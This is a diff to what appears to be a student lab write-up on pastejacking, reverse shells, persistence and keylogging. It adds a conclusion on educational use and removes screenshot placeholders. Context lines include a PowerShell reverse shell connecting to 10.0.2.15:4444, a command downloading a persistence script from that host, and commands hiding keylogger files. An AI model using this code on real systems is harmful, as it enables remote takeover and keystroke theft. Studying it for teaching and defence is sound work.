@@ -70,8 +70,6 @@ The Kali Linux system uses the `netcat` command to listen on port 4444, waiting 
 - `4444` is the port number to listen on.
 - `-n` stands for numeric-only IP addresses, and not to do DNS resolution or service lookups.
 
-# IMMAGINE TERMINALE KALI IN ASCOLTO
-
 The PowerShell code used to spawn the reverse shell works as follows:
 
 ```powershell
@@ -101,7 +99,7 @@ Where:
 - `$stream.Flush()`: This line clears the network stream to ensure that all data has been sent.
 - `$client.Close()`: This line closes the TCP client.
 
-# IMMAGINE POWERSHELL WIN SERVER 2K8
+
 
 ## Persistence
 
@@ -127,6 +125,7 @@ Invoke-WebRequest -Uri "http://10.0.2.15/Persistance.vbs" -OutFile "C:\Persistan
 # IMMAGINE RS KALI CON COMANDI ESEGUITI E LS PER VEDERE I FILE SCARICATI
 
 Here the code inside the file "Persistance.ps1"
+
 ```powershell
 Start-Job -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',4444)
 $stream = $client.GetStream()
@@ -179,3 +178,14 @@ attrib +h Key_Logger_Dw.ps1; attrib +h Key_Logger_Dw.vbs; attrib +h Key_Logger.e
 (Note: Insert screenshot of the keylogger, client, and server programs here)
 
 (Note: Insert code snippet of the keylogger, client, and server programs here)
+
+## Conclusion
+
+This project has provided a comprehensive exploration of several cybersecurity techniques, including pastejacking, reverse shell exploitation, persistence, and keylogging. Each of these techniques represents a potential threat that can be used by attackers to gain unauthorized access to systems, execute malicious commands, maintain persistent access, and gather sensitive information.
+
+The demonstration was conducted in a controlled and safe environment, strictly for educational purposes. It serves as a reminder of the potential dangers of executing untrusted code, visiting unverified websites, and the importance of maintaining robust security measures to protect against such threats.
+
+Through understanding these techniques, it is hoped that better preparation can be made to prevent such intrusions and safeguard digital environments. It is important to remember that these techniques should only be used ethically and legally. Misuse of such techniques can lead to severe consequences.
+
+The project also highlights the importance of continuous learning and staying updated in the field of cybersecurity, given the rapidly evolving nature of cyber threats. It is hoped that this knowledge will contribute to the development of more secure systems and the safe use of digital resources.
+
